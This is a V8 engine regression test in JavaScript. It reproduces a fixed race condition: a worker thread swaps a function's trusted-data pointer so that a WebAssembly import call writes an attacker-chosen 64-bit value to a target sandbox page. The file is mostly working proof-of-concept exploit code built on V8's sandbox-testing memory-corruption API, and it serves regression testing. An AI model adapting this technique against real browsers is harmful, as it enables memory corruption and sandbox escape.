// Copyright 2024 the V8 project authors. All rights reserved.
// Use of this source code is governed by a BSD-style license that can be
// found in the LICENSE file.

// Flags: --sandbox-testing

d8.file.execute('test/mjsunit/wasm/wasm-module-builder.js');

// module 0: exporter
let builder = new WasmModuleBuilder();
let $struct = builder.addStruct([makeField(kWasmI64, true)]);
let $sig_v_s = builder.addType(makeSig([wasmRefType($struct)], []));
builder.addFunction("writer", $sig_v_s)
  .exportFunc()
  .addBody([
    kExprLocalGet, 0,
    kExprI64Const, 42,
    kGCPrefix, kExprStructSet, $struct, 0,
  ]);
builder.addFunction("dummy", kSig_v_l).exportFunc().addBody([]);
let instance0 = builder.instantiate();
let { writer, dummy } = instance0.exports;

// module 1: importer
builder = new WasmModuleBuilder();
$struct = builder.addStruct([makeField(kWasmI64, true)]);
$sig_v_s = builder.addType(makeSig([wasmRefType($struct)], []));
let $sig_v_l = builder.addType(kSig_v_l);
let $importWriter = builder.addImport('import', 'writer', $sig_v_l);
let $boom = builder.addFunction("boom", $sig_v_l)
  .exportFunc()
  .addBody([
    kExprLocalGet, 0,
    kExprCallFunction, $importWriter,
  ]);

// Prepare corruption utilities.
const kHeapObjectTag = 1;
const kJSFunctionSFIOffset = 16;
const kSharedFunctionInfoTrustedDataOffset = 4;

let memory = new DataView(new Sandbox.MemoryView(0, 0x100000000));
function getPtr(obj) {
  return Sandbox.getAddressOf(obj) + kHeapObjectTag;
}
function getField(obj, offset) {
  return memory.getUint32(obj + offset - kHeapObjectTag, true);
}
function setField(obj, offset, value) {
  memory.setUint32(obj + offset - kHeapObjectTag, value, true);
}

let writer_sfi = getField(getPtr(writer), kJSFunctionSFIOffset);
let writer_tfd = getField(writer_sfi, kSharedFunctionInfoTrustedDataOffset);

let dummy_sfi = getField(getPtr(dummy), kJSFunctionSFIOffset);
let dummy_tfd = getField(dummy_sfi, kSharedFunctionInfoTrustedDataOffset);

let workerScript = `
  // Prepare corruption utilities.
  const kHeapObjectTag = 1;
  const kSharedFunctionInfoTrustedDataOffset = 4;
  let memory = new DataView(new Sandbox.MemoryView(0, 0x100000000));
  function getPtr(obj) {
    return Sandbox.getAddressOf(obj) + kHeapObjectTag;
  }
  function getField(obj, offset) {
    return memory.getUint32(obj + offset - kHeapObjectTag, true);
  }
  function setField(obj, offset, value) {
    memory.setUint32(obj + offset - kHeapObjectTag, value, true);
  }
  let writer_sfi = ${writer_sfi};
  let writer_tfd = ${writer_tfd};
  let dummy_tfd = ${dummy_tfd};
  while (true) {
    setField(writer_sfi, kSharedFunctionInfoTrustedDataOffset, dummy_tfd);
    setField(writer_sfi, kSharedFunctionInfoTrustedDataOffset, writer_tfd);
  }
`;
let worker = new Worker(workerScript, {type: 'string'});

// Before fixing the issue, this usually took 1-5 iterations until it got
// lucky enough to win the race condition.
for (let i = 0; i < 100; i++) {
  try {
    let instance1 = builder.instantiate({'import': {'writer': writer}});
    instance1.exports.boom(BigInt(Sandbox.targetPage) - 0x7n);
  } catch {
    // Just try again.
  }
}
